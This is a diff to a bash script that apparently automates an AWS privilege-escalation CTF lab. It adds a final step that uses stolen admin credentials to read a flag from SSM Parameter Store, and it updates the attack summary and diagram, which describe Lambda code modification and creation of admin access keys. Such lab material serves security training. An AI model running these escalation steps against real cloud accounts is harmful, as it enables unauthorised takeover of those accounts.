@@ -500,6 +500,22 @@ echo ""
 # Clean up temporary files (keep backup for cleanup script)
 rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/response.json
 
+# [EXPLOIT] Step 20: Capture the CTF flag
+# The admin user has AdministratorAccess, which grants ssm:GetParameter implicitly.
+# Use those credentials to read the scenario flag from SSM Parameter Store.
+echo -e "${YELLOW}Step 20: Capturing CTF flag from SSM Parameter Store${NC}"
+FLAG_PARAM_NAME="/pathfinding-labs/flags/lambda-004 + iam-002-to-admin"
+show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name \"$FLAG_PARAM_NAME\" --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
+fi
+echo ""
+
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
     for cmd in "${ATTACK_COMMANDS[@]}"; do
@@ -512,7 +528,7 @@ fi
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}MULTI-HOP PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER"
@@ -530,6 +546,7 @@ echo "   - Created access keys for: $ADMIN_USER"
 echo "   - Switched to admin user credentials"
 echo ""
 echo "4. Achieved: Full administrator access"
+echo "5. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path Diagram:${NC}"
 echo -e "  $STARTING_USER"
@@ -546,8 +563,9 @@ echo -e "  | (iam:CreateAccessKey)"
 echo -e "  v"
 echo -e "  $ADMIN_USER [access keys created]"
 echo -e "  |"
+echo -e "  | (ssm:GetParameter)"
 echo -e "  v"
-echo -e "  ADMIN ACCESS"
+echo -e "  CTF FLAG"
 
 echo -e "\n${YELLOW}Why This Works:${NC}"
 echo "- lambda:UpdateFunctionCode allows modifying the function's code"
